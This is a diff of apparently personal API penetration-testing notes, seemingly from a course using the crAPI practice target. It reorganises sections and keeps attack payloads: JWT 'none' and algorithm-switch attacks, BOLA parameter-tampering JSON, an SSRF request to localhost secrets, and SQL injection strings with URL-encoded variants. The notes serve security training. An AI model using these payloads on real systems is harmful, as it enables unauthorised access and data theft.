@@ -1,55 +1,28 @@
-Reconnaissance:
-
-TruffleHog
-The Wayback Machine
-Nmap
-OWASP Amass
-Gobuster --> Directory Brute-force
-Kiterunner
-DevTools
-
-
-Endpoint Analysis:
-
-Reverse Engineering
-Postman
-mitmweb
-mitmproxy2swagger
-
-Check Excessive Data Exposure
-
-
-Scanning:
-
-Nikto
-nikto -h http://crapi.apisec.ai
-
-OWASP ZAP
-Import the target's API specification file
-
-
-Authentication:
-
-Brute-forcing and Password Spraying
-Token Analysis
-
-JWT Attacks
+JWT Attacks:
 echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9|base64 -d
 date --date=@'{timestamp}'
+
 The None Attack
 eyJhbGciOiJub25lIn0
+
 The Algorithm Switch Attack --> RS256 to HS256
+
 JWT Crack Attack
 
 JWT_Tool
 
 
-Authorization:
-
-Broken Object Level Authorization
+Broken Object Level Authorization:
 A-B testing
 
-Broken Function Level Authorization
+Valid Request:
+{"Account" : 2222}
+Try:
+{"Account" : [3333]}
+{"Account" : {"Account" : 3333}}
+{"Account" : 2222, "Account" : 3333, "Account" : 5555}
+
+Broken Function Level Authorization:
 A-B-A testing
 
 
@@ -120,7 +93,7 @@ POST api/v1/store/products
 headers…
 {
 "inventory":"§http://localhost/secrets§"
- }
+}
 
 
 Injection:
@@ -226,17 +199,3 @@ Double URL Encoded Payload
 ' OR 1=1;
 %27%20%4f%52%20%31%3d%31%3b
 %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
-
-
-BOLA:
-Valid Request:
-{"Account" : 2222}
-Try:
-{"Account" : [3333]}
-{"Account" : {"Account" : 3333}}
-{"Account" : 2222, "Account" : 3333, "Account" : 5555}
-
-
-File Upload:
-Content-Type: text/html
-<a href="https://www.google.com/">Click Here</a>
